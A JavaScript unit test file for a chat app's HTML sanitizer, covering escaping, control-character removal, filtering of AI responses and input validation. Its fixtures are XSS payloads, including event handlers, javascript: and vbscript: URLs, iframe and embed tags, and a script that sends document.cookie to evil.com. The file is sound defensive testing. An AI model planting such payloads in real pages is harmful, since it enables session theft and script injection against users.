/**
 * Unit tests for input sanitization utilities
 * Tests Requirements: 23.6, 23.7
 */

import { describe, it, expect } from 'vitest';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);
const {
  escapeHTML,
  sanitizeUserInput,
  filterAIResponse,
  validateInputSafety
} = require('../../server/utils/sanitizer.js');

describe('Sanitizer - escapeHTML', () => {
  it('should escape HTML special characters', () => {
    const input = '<script>alert("XSS")</script>';
    const result = escapeHTML(input);
    expect(result).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;');
  });

  it('should escape ampersands', () => {
    const input = 'Tom & Jerry';
    const result = escapeHTML(input);
    expect(result).toBe('Tom &amp; Jerry');
  });

  it('should escape quotes', () => {
    const input = `He said "Hello" and 'Goodbye'`;
    const result = escapeHTML(input);
    expect(result).toBe('He said &quot;Hello&quot; and &#x27;Goodbye&#x27;');
  });

  it('should handle empty string', () => {
    expect(escapeHTML('')).toBe('');
  });

  it('should handle non-string input', () => {
    expect(escapeHTML(null)).toBe('');
    expect(escapeHTML(undefined)).toBe('');
    expect(escapeHTML(123)).toBe('');
  });
});

describe('Sanitizer - sanitizeUserInput', () => {
  it('should escape HTML in user input', () => {
    const input = '<img src=x onerror=alert(1)>';
    const result = sanitizeUserInput(input);
    expect(result).toContain('&lt;');
    expect(result).toContain('&gt;');
    expect(result).not.toContain('<');
    expect(result).not.toContain('>');
  });

  it('should remove null bytes', () => {
    const input = 'Hello\x00World';
    const result = sanitizeUserInput(input);
    expect(result).not.toContain('\x00');
    expect(result).toContain('Hello');
    expect(result).toContain('World');
  });

  it('should remove control characters except newlines and tabs', () => {
    const input = 'Hello\x01\x02World\nNew Line\tTab';
    const result = sanitizeUserInput(input);
    expect(result).not.toContain('\x01');
    expect(result).not.toContain('\x02');
    expect(result).toContain('\n');
    expect(result).toContain('\t');
  });

  it('should trim whitespace', () => {
    const input = '  Hello World  ';
    const result = sanitizeUserInput(input);
    expect(result).toBe('Hello World');
  });

  it('should handle Arabic text correctly', () => {
    const input = 'مرحباً بك في BrightAI';
    const result = sanitizeUserInput(input);
    expect(result).toBe('مرحباً بك في BrightAI');
  });

  it('should handle empty string', () => {
    expect(sanitizeUserInput('')).toBe('');
  });

  it('should handle non-string input', () => {
    expect(sanitizeUserInput(null)).toBe('');
    expect(sanitizeUserInput(undefined)).toBe('');
    expect(sanitizeUserInput(123)).toBe('');
  });

  it('should sanitize complex XSS attempt', () => {
    const input = '<script>fetch("evil.com?cookie="+document.cookie)</script>';
    const result = sanitizeUserInput(input);
    expect(result).not.toContain('<script>');
    expect(result).toContain('&lt;script&gt;');
  });
});

describe('Sanitizer - filterAIResponse', () => {
  it('should remove script tags', () => {
    const response = 'Hello <script>alert("XSS")</script> World';
    const result = filterAIResponse(response);
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('alert');
    expect(result).toContain('Hello');
    expect(result).toContain('World');
  });

  it('should remove script tags case-insensitively', () => {
    const response = 'Test <SCRIPT>alert(1)</SCRIPT> text';
    const result = filterAIResponse(response);
    expect(result).not.toContain('<SCRIPT>');
    expect(result).not.toContain('alert');
  });

  it('should remove iframe tags', () => {
    const response = 'Content <iframe src="evil.com"></iframe> more';
    const result = filterAIResponse(response);
    expect(result).not.toContain('<iframe');
    expect(result).not.toContain('evil.com');
  });

  it('should remove object tags', () => {
    const response = 'Text <object data="evil.swf"></object> end';
    const result = filterAIResponse(response);
    expect(result).not.toContain('<object');
    expect(result).not.toContain('evil.swf');
  });

  it('should remove embed tags', () => {
    const response = 'Start <embed src="evil.swf"> finish';
    const result = filterAIResponse(response);
    expect(result).not.toContain('<embed');
    expect(result).not.toContain('evil.swf');
  });

  it('should remove event handler attributes', () => {
    const response = '<div onclick="alert(1)">Click me</div>';
    const result = filterAIResponse(response);
    expect(result).not.toContain('onclick');
    expect(result).toContain('Click me');
  });

  it('should remove various event handlers', () => {
    const response = '<img onerror="alert(1)" onload="alert(2)" src="x">';
    const result = filterAIResponse(response);
    expect(result).not.toContain('onerror');
    expect(result).not.toContain('onload');
  });

  it('should remove javascript: protocol', () => {
    const response = '<a href="javascript:alert(1)">Link</a>';
    const result = filterAIResponse(response);
    expect(result).not.toContain('javascript:');
  });

  it('should remove data: protocol for HTML', () => {
    const response = '<a href="data:text/html,<script>alert(1)</script>">Link</a>';
    const result = filterAIResponse(response);
    expect(result).not.toContain('data:text/html');
  });

  it('should remove vbscript: protocol', () => {
    const response = '<a href="vbscript:msgbox(1)">Link</a>';
    const result = filterAIResponse(response);
    expect(result).not.toContain('vbscript:');
  });

  it('should preserve safe Arabic content', () => {
    const response = 'مرحباً! كيف يمكنني مساعدتك اليوم؟';
    const result = filterAIResponse(response);
    expect(result).toBe(response);
  });

  it('should handle empty string', () => {
    expect(filterAIResponse('')).toBe('');
  });

  it('should handle non-string input', () => {
    expect(filterAIResponse(null)).toBe('');
    expect(filterAIResponse(undefined)).toBe('');
    expect(filterAIResponse(123)).toBe('');
  });

  it('should handle complex nested attacks', () => {
    const response = '<div><script>alert(1)</script><iframe src="x"></iframe></div>';
    const result = filterAIResponse(response);
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('<iframe>');
    expect(result).not.toContain('alert');
  });
});

describe('Sanitizer - validateInputSafety', () => {
  it('should return true for safe input', () => {
    expect(validateInputSafety('Hello World')).toBe(true);
    expect(validateInputSafety('مرحباً بك')).toBe(true);
    expect(validateInputSafety('Safe text 123')).toBe(true);
  });

  it('should return false for script tags', () => {
    expect(validateInputSafety('<script>alert(1)</script>')).toBe(false);
  });

  it('should return false for javascript: protocol', () => {
    expect(validateInputSafety('javascript:alert(1)')).toBe(false);
  });

  it('should return false for event handlers', () => {
    expect(validateInputSafety('onclick=alert(1)')).toBe(false);
    expect(validateInputSafety('onerror=alert(1)')).toBe(false);
  });

  it('should return false for iframe tags', () => {
    expect(validateInputSafety('<iframe src="x"></iframe>')).toBe(false);
  });

  it('should return false for object tags', () => {
    expect(validateInputSafety('<object data="x"></object>')).toBe(false);
  });

  it('should return false for embed tags', () => {
    expect(validateInputSafety('<embed src="x">')).toBe(false);
  });

  it('should return false for eval', () => {
    expect(validateInputSafety('eval(code)')).toBe(false);
  });

  it('should return false for vbscript', () => {
    expect(validateInputSafety('vbscript:msgbox(1)')).toBe(false);
  });

  it('should return false for data:text/html', () => {
    expect(validateInputSafety('data:text/html,<script>alert(1)</script>')).toBe(false);
  });

  it('should return false for non-string input', () => {
    expect(validateInputSafety(null)).toBe(false);
    expect(validateInputSafety(undefined)).toBe(false);
    expect(validateInputSafety(123)).toBe(false);
  });
});
